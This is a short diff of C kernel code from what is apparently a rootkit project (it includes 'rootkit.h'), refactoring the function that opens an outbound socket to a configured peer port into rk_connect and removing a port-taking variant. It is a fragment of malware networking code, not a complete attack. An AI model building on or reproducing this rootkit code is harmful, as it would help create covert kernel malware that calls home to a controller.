@@ -8,11 +8,11 @@
 
 #include "rootkit.h"
 
-static struct socket *connect_to_port(unsigned short port)
+struct socket *rk_connect(void)
 {
 	struct sockaddr_in peer = {
 		.sin_family = AF_INET,
-		.sin_port = htons(port),
+		.sin_port = htons(peer_port),
 	};
 	struct socket *sock;
 	int error;
@@ -32,16 +32,6 @@ static struct socket *connect_to_port(unsigned short port)
 	}
 
 	return sock;
-}
-
-struct socket *rk_connect(void)
-{
-	return connect_to_port(peer_port);
-}
-
-struct socket *rk_connect_port(unsigned short port)
-{
-	return connect_to_port(port);
 }
 
 static int send_exact(struct socket *sock, const void *buf, size_t len)
